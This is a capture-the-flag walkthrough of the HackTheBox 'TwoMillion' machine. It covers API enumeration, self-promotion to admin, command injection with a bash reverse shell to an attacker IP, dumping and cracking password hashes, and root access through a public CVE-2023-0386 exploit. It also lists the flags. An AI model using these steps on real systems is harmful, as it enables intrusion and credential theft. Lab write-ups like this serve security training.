# TwoMillsion

> IP: [10.10.11.221]

## NOTES / STEPS

1. Deploy Machine
2. NMAP
   1. > nmap -sC -sV 10.10.11.221 -oN init_scan
      1. Port 22 -> ssh
      2. Port 80 -> http
         1. http-title: Did not follow redirect to http://2million.htb/
            1. Need to add to /etc/hosts
   2. > nmap -sC -sV 2million.htb
3. HTTP
   1. Navigate to website and inspect source code
      1. This looks like a normal SPA where the navbar scrolls the page
      2. /login
         1. This is a login form, and in here we see something interesting

            ```html
                <script>
                    $(document).ready(function() {
                        localStorage.removeItem('inviteCode');
                    });
                </script>
            ```

            1. This looks like there is an item labled "inviteCode" that is removed
   2. GOBUSTER
      1. > gobuster dir -u http://2million.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
         1. /home
         2. /login
         3. /register
         4. /api
         5. /logout
         6. /404
         7. /invite
4. /INVITE
   1. In here we see the code:

        ```js
            $(document).ready(function() {
                $('#verifyForm').submit(function(e) {
                    e.preventDefault();

                    var code = $('#code').val();
                    var formData = { "code": code };

                    $.ajax({
                        type: "POST",
                        dataType: "json",
                        data: formData,
                        url: '/api/v1/invite/verify',
                        success: function(response) {
                            if (response[0] === 200 && response.success === 1 && response.data.message === "Invite code is valid!") {
                                // Store the invite code in localStorage
                                localStorage.setItem('inviteCode', code);

                                window.location.href = '/register';
                            } else {
                                alert("Invalid invite code. Please try again.");
                            }
                        },
                        error: function(response) {
                            alert("An error occurred. Please try again.");
                        }
                    });
                });
            });
        ```

        1. We can see if we have the correct inviteCode we will be redirected to /register (which we found earlier in the gobuster scan)
   2. Looking at the scripts we see the inviteapi.min.js file

        ```js
            eval(function(p, a, c, k, e, d) {
                e = function(c) {
                    return c.toString(36)
                }
                ;
                if (!''.replace(/^/, String)) {
                    while (c--) {
                        d[c.toString(a)] = k[c] || c.toString(a)
                    }
                    k = [function(e) {
                        return d[e]
                    }
                    ];
                    e = function() {
                        return '\\w+'
                    }
                    ;
                    c = 1
                }
                ;while (c--) {
                    if (k[c]) {
                        p = p.replace(new RegExp('\\b' + e(c) + '\\b','g'), k[c])
                    }
                }
                return p
            }('1 i(4){h 8={"4":4};$.9({a:"7",5:"6",g:8,b:\'/d/e/n\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:"7",5:"6",b:\'/d/e/k/l/m\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}', 24, 24, 'response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify'.split('|'), 0, {}))
        ```

        1. Looking at this we can see there is "makeInviteCode"
        2. We also see a how/to/generate
           1. Maybe we can use this to generate our own
   3. CURL
      1. Lets try and use the how to generate
         1. > curl -X POST http://2million.htb/api/v1/invite/how/to/generate
            1. RESPONSE: {"0":200,"success":1,"data":{"data":"Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr\/trarengr","enctype":"ROT13"},"hint":"Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."}
            2. This looks like ROT13 and just like the hint suggests 
      2. FROM ROT13
         1. "In order to generate the invite code, make a POST request to \/api\/v1\/invite\/generate"
      3. GENERATE
         1. > curl -X POST http://2million.htb/api/v1/invite/generate
            1. RESPONSE: {"0":200,"success":1,"data":{"code":"VE1FMTItWFVPTU0tQ1BHU1ctRjYyOTU=","format":"encoded"}}
               1. This looks like base64 encoded text
                  1. FROM BASE64 -> "TME12-XUOMM-CPGSW-F6295"
                  2. SUCCESS! We have an invite token
5. /REGISTER
   1. Input the invite token
   2. UN: sample@gmail.com
   3. PW: password1234
6. /LOGIN
   1. SUCCESS!
   2. We are now met with a dashboard
      1. Looking around we see we can download a VPN (openVPN) config file
   3. API
      1. When downloading the config file we see /api/v1/user/vpn/generate
      2. There could be more API points
      3. Lets open this up in burpsuite and look for more endpoints
7. BURPSUITE
   1. Target -> Repeater -> http://2million.htb/api/v1

        ```json
            {
            "v1": {
                "user": {
                    "GET": {
                        "/api/v1": "Route List",
                        "/api/v1/invite/how/to/generate": "Instructions on invite code generation",
                        "/api/v1/invite/generate": "Generate invite code",
                        "/api/v1/invite/verify": "Verify invite code",
                        "/api/v1/user/auth": "Check if user is authenticated",
                        "/api/v1/user/vpn/generate": "Generate a new VPN configuration",
                        "/api/v1/user/vpn/regenerate": "Regenerate VPN configuration",
                        "/api/v1/user/vpn/download": "Download OVPN file"
                    },
                    "POST": {
                        "/api/v1/user/register": "Register a new user",
                        "/api/v1/user/login": "Login with existing user"
                    }
                },
                "admin": {
                    "GET": {
                        "/api/v1/admin/auth": "Check if user is admin"
                    },
                    "POST": {
                        "/api/v1/admin/vpn/generate": "Generate VPN for specific user"
                    },
                    "PUT": {
                        "/api/v1/admin/settings/update": "Update user settings"
                    }
                }
            }
            }
        ```

        1. In here we see several endpoints, especially ones pertaining to ADMIN
           1. Specificaly we see that we can use "auth" to check if we are admin and if not potentially use "update" to setus as admin
   2. ADMIN
      1. GET -> /api/v1/admin/auth
         1. RESPONSE: {"message":false}
      2. PUT -> /api/v1/admin/settings/update
         1. RESPONSE: {"status":"danger","message":"Invalid content type."}
            1. Lets add the content-type: application/json
         2. RESPONSE: {"status":"danger","message":"Missing parameter: email"}
            1. Lets add email
               1. {"email":"sample@gmail.com"}
         3. RESPONSE: {"status":"danger","message":"Missing parameter: is_admin"}
            1. Lets add is_admin and set to true or (1)
               1. {"is_admin":"1"}
         4. RESPONSE:
            1. {"id":25,"username":"sample","is_admin":1}
      3. Now if we go back and check our /api/v1/admin/auth
         1. RSEPONSE: {"message":true}
            1. So we succeeded as setting our user as admin
   3. EXPLOIT
      1. We now need to somehow get code execution
      2. We can more than likely use the /generate api endpoint
      3. POST
         1. /api/v1/admin/vpn/generate
            1. ERROR: {"status":"danger","message":"Missing parameter: username"}
         2. /api/v1/admin/vpn/generate  
            1. Add Content-Type:application/json
            2. Add {"username":";[PAYLOAD-HERE]"}
               1. PAYLOAD -> ls
                  1. Didn't work
               2. PAYLOAD -> ls #
                  1. Database.php, Router.php, VPN, assets, controllers, css, fonts, images, index.php, js, views
               3. PAYLOAD (for revshell) -> bash -c 'bash -i >& /dev/tcp/10.10.15.11/1234 0>&1'
                  1. SUCCESS!!!
8. ENUMERATION
   1. Lets checkout the .env file
      1. > cat .env

            ```env
                DB_HOST=127.0.0.1
                DB_DATABASE=htb_prod
                DB_USERNAME=admin
                DB_PASSWORD=SuperDuperPass123
            ```

            1. In here we see a database username and password, lets see if we can signin and find other credentials
   2. MYSQL
      1. > mysql -uadmin -p
         1. PASS: SuperDuperPass123
      2. > show databases;
         1. htb_prod, information_schema
      3. > use htb_prod;
      4. > show tables;
         1. invite_codes, users
      5. > select * from users;

            ```text
                +----+--------------+----------------------------+--------------------------------------------------------------+----------+
                | id | username     | email                      | password                                                     | is_admin |
                +----+--------------+----------------------------+--------------------------------------------------------------+----------+
                | 11 | TRX          | trx@hackthebox.eu          | $2y$10$TG6oZ3ow5UZhLlw7MDME5um7j/7Cw1o6BhY8RhHMnrr2ObU3loEMq |        1 |
                | 12 | TheCyberGeek | thecybergeek@hackthebox.eu | $2y$10$wATidKUukcOeJRaBpYtOyekSpwkKghaNYr5pjsomZUKAd0wbzw4QK |        1 |
                | 13 | sample       | sample@gmail.com           | $2y$10$6axL2ObRdok.MfInGsYRFeuB4tJdyK69OqeCuMEzzWgqEOYANcGfy |        1 |
                | 14 | test         | test@2million.htb          | $2y$10$J.9Dy1KRYolK/AGn4mO7XOIiixEXZIXG1y0CDSYl5DwQjyxaWWOhW |        0 |
                +----+--------------+----------------------------+--------------------------------------------------------------+----------+
            ```

            1. In here we see several users, in fact we even see our "sample" user, and their hashed passwords
            2. Use the hashes for john-the-ripper
   3. JOHN-THE-RIPPER
      1. > echo "$2y$10$J.9Dy1KRYolK/AGn4mO7XOIiixEXZIXG1y0CDSYl5DwQjyxaWWOhW" > test.hash
      2. > john ./test.hash
         1. RESPONSE: 12345
         2. Now lets try this user
   4. Switch Users
      1. Sign in as test
         1. > su test
         2. RESPOSNE: su: user test does not exist or the user entry does not contain all the required fields
      2. Maybe we need to use the admin user for MYSQL rather then cracking the hash
         1. > su admin
            1. PW: SuperDuperPass123
   5. FLAG
      1. Get the user flag
         1. > cat /home/admin/user.txt
            1. FLAG: `f07bcb612c65cbb455d05b0193a81c17`
   6. LINPEAS
      1. Checking Pkexec policy
         1. AdminIdentities=unix-group:sudo;unix-group:admin
   7. MAIL
      1. When we logged in we saw there was a "Mail" message
         1. > cat /var/mail/admin

            ```text
               Hey admin,

               I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.

               HTB Godfather
            ```

            1. In here we see a note hinting at CVEs for the particular linux kernel used on the machine, specifically addressing OverlayFS & FUSE
            2. Lets do some research
9. CVE RESEARCH
   1. Check the OS
      1. > uname -r
         1. RESPONSE: 5.15.70-051570-generic
   2. Looking up vulnerabilities with the specific linux version and keywords overlayfs we see a potenital CVE
      1. CVE-2023-0386
   3. GITHUB
      1. Looking through exploits we see a repo that might be helpful
         1. LINK: "https://github.com/sxlmnwb/CVE-2023-0386"
10. EXPLOIT
    1. Lets upload our code we found from the github repo
    2. Unzip the file
       1. > unzip CVE-2023-0386-master.zip
    3. based on the instructions we need to
       1. > make all
       2. In first terminal
          1. > ./fuse ./ovlcap/lower ./gc
       3. In second terminal
          1. > ./exp
          2. SUCCESS
    4. FLAG
       1. > cat /root/root.txt
          1. FLAG: `037fe9a9cc907bd203681e2d753c60d3`
11. EXTRA
    1. In the /root folder we see a thank_you.json file

      ```json
         {"encoding": "url", "data": "%7B%22encoding%22:%20%22hex%22,%20%22data%22:%20%227b22656e6372797074696f6e223a2022786f72222c2022656e6372707974696f6e5f6b6579223a20224861636b546865426f78222c2022656e636f64696e67223a2022626173653634222c202264617461223a20224441514347585167424345454c43414549515173534359744168553944776f664c5552765344676461414152446e51634454414746435145423073674230556a4152596e464130494d556745596749584a51514e487a7364466d494345535145454238374267426942685a6f4468595a6441494b4e7830574c526844487a73504144594848547050517a7739484131694268556c424130594d5567504c525a594b513848537a4d614244594744443046426b6430487742694442306b4241455a4e527741596873514c554543434477424144514b4653305046307337446b557743686b7243516f464d306858596749524a41304b424470494679634347546f4b41676b344455553348423036456b4a4c4141414d4d5538524a674952446a41424279344b574334454168393048776f334178786f44777766644141454e4170594b67514742585159436a456345536f4e426b736a41524571414130385151594b4e774246497745636141515644695952525330424857674f42557374427842735a58494f457777476442774e4a30384f4c524d61537a594e4169734246694550424564304941516842437767424345454c45674e497878594b6751474258514b45437344444767554577513653424571436c6771424138434d5135464e67635a50454549425473664353634c4879314245414d31476777734346526f416777484f416b484c52305a5041674d425868494243774c574341414451386e52516f73547830774551595a5051304c495170594b524d47537a49644379594f4653305046776f345342457454776774457841454f676b4a596734574c4545544754734f414445634553635041676430447863744741776754304d2f4f7738414e6763644f6b31444844464944534d5a48576748444267674452636e4331677044304d4f4f68344d4d4141574a51514e48335166445363644857674944515537486751324268636d515263444a6745544a7878594b5138485379634444433444433267414551353041416f734368786d5153594b4e7742464951635a4a41304742544d4e525345414654674e4268387844456c6943686b7243554d474e51734e4b7745646141494d425355644144414b48475242416755775341413043676f78515241415051514a59674d644b524d4e446a424944534d635743734f4452386d4151633347783073515263456442774e4a3038624a773050446a63634444514b57434550467734344241776c4368597242454d6650416b5259676b4e4c51305153794141444446504469454445516f36484555684142556c464130434942464c534755734a304547436a634152534d42484767454651346d45555576436855714242464c4f7735464e67636461436b434344383844536374467a424241415135425241734267777854554d6650416b4c4b5538424a785244445473615253414b4553594751777030474151774731676e42304d6650414557596759574b784d47447a304b435364504569635545515578455574694e68633945304d494f7759524d4159615052554b42446f6252536f4f4469314245414d314741416d5477776742454d644d526f6359676b5a4b684d4b4348514841324941445470424577633148414d744852566f414130506441454c4d5238524f67514853794562525459415743734f445238394268416a4178517851516f464f676354497873646141414e4433514e4579304444693150517a777853415177436c67684441344f4f6873414c685a594f424d4d486a424943695250447941414630736a4455557144673474515149494e7763494d674d524f776b47443351634369554b44434145455564304351736d547738745151594b4d7730584c685a594b513858416a634246534d62485767564377353043776f334151776b424241596441554d4c676f4c5041344e44696449484363625744774f51776737425142735a5849414242454f637874464e67425950416b47537a6f4e48545a504779414145783878476b6c694742417445775a4c497731464e5159554a45454142446f6344437761485767564445736b485259715477776742454d4a4f78304c4a67344b49515151537a734f525345574769305445413433485263724777466b51516f464a78674d4d41705950416b47537a6f4e48545a504879305042686b31484177744156676e42304d4f4941414d4951345561416b434344384e467a464457436b50423073334767416a4778316f41454d634f786f4a4a6b385049415152446e514443793059464330464241353041525a69446873724242415950516f4a4a30384d4a304543427a6847623067344554774a517738784452556e4841786f4268454b494145524e7773645a477470507a774e52516f4f47794d3143773457427831694f78307044413d3d227d%22%7D"}
      ```

      1. Lets decode this for fun
    2. CYBERCHEF
       1. FROM HEX

         ```json
            {"encryption": "xor", "encrpytion_key": "HackTheBox", "encoding": "base64", "data": "DAQCGXQgBCEELCAEIQQsSCYtAhU9DwofLURvSDgdaAARDnQcDTAGFCQEB0sgB0UjARYnFA0IMUgEYgIXJQQNHzsdFmICESQEEB87BgBiBhZoDhYZdAIKNx0WLRhDHzsPADYHHTpPQzw9HA1iBhUlBA0YMUgPLRZYKQ8HSzMaBDYGDD0FBkd0HwBiDB0kBAEZNRwAYhsQLUECCDwBADQKFS0PF0s7DkUwChkrCQoFM0hXYgIRJA0KBDpIFycCGToKAgk4DUU3HB06EkJLAAAMMU8RJgIRDjABBy4KWC4EAh90Hwo3AxxoDwwfdAAENApYKgQGBXQYCjEcESoNBksjAREqAA08QQYKNwBFIwEcaAQVDiYRRS0BHWgOBUstBxBsZXIOEwwGdBwNJ08OLRMaSzYNAisBFiEPBEd0IAQhBCwgBCEELEgNIxxYKgQGBXQKECsDDGgUEwQ6SBEqClgqBA8CMQ5FNgcZPEEIBTsfCScLHy1BEAM1GgwsCFRoAgwHOAkHLR0ZPAgMBXhIBCwLWCAADQ8nRQosTx0wEQYZPQ0LIQpYKRMGSzIdCyYOFS0PFwo4SBEtTwgtExAEOgkJYg4WLEETGTsOADEcEScPAgd0DxctGAwgT0M/Ow8ANgcdOk1DHDFIDSMZHWgHDBggDRcnC1gpD0MOOh4MMAAWJQQNH3QfDScdHWgIDQU7HgQ2BhcmQRcDJgETJxxYKQ8HSycDDC4DC2gAEQ50AAosChxmQSYKNwBFIQcZJA0GBTMNRSEAFTgNBh8xDEliChkrCUMGNQsNKwEdaAIMBSUdADAKHGRBAgUwSAA0CgoxQRAAPQQJYgMdKRMNDjBIDSMcWCsODR8mAQc3Gx0sQRcEdBwNJ08bJw0PDjccDDQKWCEPFw44BAwlChYrBEMfPAkRYgkNLQ0QSyAADDFPDiEDEQo6HEUhABUlFA0CIBFLSGUsJ0EGCjcARSMBHGgEFQ4mEUUvChUqBBFLOw5FNgcdaCkCCD88DSctFzBBAAQ5BRAsBgwxTUMfPAkLKU8BJxRDDTsaRSAKESYGQwp0GAQwG1gnB0MfPAEWYgYWKxMGDz0KCSdPEicUEQUxEUtiNhc9E0MIOwYRMAYaPRUKBDobRSoODi1BEAM1GAAmTwwgBEMdMRocYgkZKhMKCHQHA2IADTpBEwc1HAMtHRVoAA0PdAELMR8ROgQHSyEbRTYAWCsODR89BhAjAxQxQQoFOgcTIxsdaAAND3QNEy0DDi1PQzwxSAQwClghDA4OOhsALhZYOBMMHjBICiRPDyAAF0sjDUUqDg4tQQIINwcIMgMROwkGD3QcCiUKDCAEEUd0CQsmTw8tQQYKMw0XLhZYKQ8XAjcBFSMbHWgVCw50Cwo3AQwkBBAYdAUMLgoLPA4NDidIHCcbWDwOQwg7BQBsZXIABBEOcxtFNgBYPAkGSzoNHTZPGyAAEx8xGkliGBAtEwZLIw1FNQYUJEEABDocDCwaHWgVDEskHRYqTwwgBEMJOx0LJg4KIQQQSzsORSEWGi0TEA43HRcrGwFkQQoFJxgMMApYPAkGSzoNHTZPHy0PBhk1HAwtAVgnB0MOIAAMIQ4UaAkCCD8NFzFDWCkPB0s3GgAjGx1oAEMcOxoJJk8PIAQRDnQDCy0YFC0FBA50ARZiDhsrBBAYPQoJJ08MJ0ECBzhGb0g4ETwJQw8xDRUnHAxoBhEKIAERNwsdZGtpPzwNRQoOGyM1Cw4WBx1iOx0pDA=="}
         ```

         1. So we see this is encrypted data
         2. The encoding is base64
         3. The encryption is XOR with a key "HackTheBox"
    3. CYBERCHEF PT.2
       1. FROM BASE64
       2. XOR
          1. KEY: HackTheBox -> encode this with base64

            ```text
               Dear HackTheBox Community,

               We are thrilled to announce a momentous milestone in our journey together. With immense joy and gratitude, we celebrate the achievement of reaching 2 million remarkable users! This incredible feat would not have been possible without each and every one of you.

               From the very beginning, HackTheBox has been built upon the belief that knowledge sharing, collaboration, and hands-on experience are fundamental to personal and professional growth. Together, we have fostered an environment where innovation thrives and skills are honed. Each challenge completed, each machine conquered, and every skill learned has contributed to the collective intelligence that fuels this vibrant community.

               To each and every member of the HackTheBox community, thank you for being a part of this incredible journey. Your contributions have shaped the very fabric of our platform and inspired us to continually innovate and evolve. We are immensely proud of what we have accomplished together, and we eagerly anticipate the countless milestones yet to come.

               Here's to the next chapter, where we will continue to push the boundaries of cybersecurity, inspire the next generation of ethical hackers, and create a world where knowledge is accessible to all.

               With deepest gratitude,

               The HackTheBox Team
            ```

            1. SUCCESS!

## QUESTIONS

1. Submit user flag
   1. `f07bcb612c65cbb455d05b0193a81c17`
2. Submit root flag
   1. `037fe9a9cc907bd203681e2d753c60d3`
